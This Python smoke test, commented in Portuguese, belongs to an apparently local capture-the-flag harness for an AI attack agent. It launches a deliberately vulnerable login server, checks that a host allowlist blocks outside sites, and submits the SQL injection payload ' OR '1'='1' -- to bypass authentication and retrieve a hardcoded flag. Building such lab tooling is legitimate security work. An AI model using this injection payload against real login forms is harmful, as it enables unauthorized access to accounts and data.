"""Smoke test sem LLM: sobe o alvo nivel 1 e simula as acoes do agente
(explorar + injetar SQLi) usando as proprias ferramentas. Prova que alvo,
guarda de allowlist e ferramentas funcionam, independente do modelo.
"""

import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).parent
sys.path.insert(0, str(ROOT))

from agent.tools import ToolContext, dispatch  # noqa: E402

TARGET = "http://127.0.0.1:8000"
EXPECTED = "flag{sql_1nj3ct10n_b00tstr4p}"


def main() -> int:
    proc = subprocess.Popen(
        [sys.executable, str(ROOT / "targets" / "level1_sqli.py")],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    try:
        time.sleep(1.0)  # da tempo do servidor subir
        ctx = ToolContext(allowed_hosts={"127.0.0.1", "localhost"})

        # 1) allowlist bloqueia host externo
        blocked = dispatch(ctx, "http_request", {"method": "GET", "url": "http://example.com/"})
        assert "error" in blocked, "allowlist deveria bloquear host externo"
        print("[1] ✅ allowlist bloqueou host externo")

        # 2) explora a pagina inicial
        home = dispatch(ctx, "http_request", {"method": "GET", "url": TARGET + "/"})
        assert home["status"] == 200 and "login" in home["body"].lower()
        print("[2] ✅ pagina inicial acessivel, formulario de login visivel")

        # 3) injeta SQLi no login (bypass de autenticacao)
        attack = dispatch(
            ctx,
            "http_request",
            {
                "method": "POST",
                "url": TARGET + "/login",
                "data": {"username": "' OR '1'='1' -- ", "password": "x"},
            },
        )
        assert EXPECTED in attack["body"], "SQLi deveria expor a flag"
        print("[3] ✅ SQL injection funcionou, flag presente na resposta")

        # 4) submit_flag aceita a flag capturada
        flag_line = next(ln for ln in attack["body"].split() if ln.startswith("flag{"))
        result = dispatch(ctx, "submit_flag", {"flag": flag_line})
        assert result["ok"] and ctx.found_flag == EXPECTED
        print(f"[4] ✅ submit_flag registrou: {ctx.found_flag}")

        print("\n🎉 fundacao 100% funcional — falta so plugar o cerebro (Ollama).")
        return 0
    finally:
        proc.terminate()


if __name__ == "__main__":
    raise SystemExit(main())
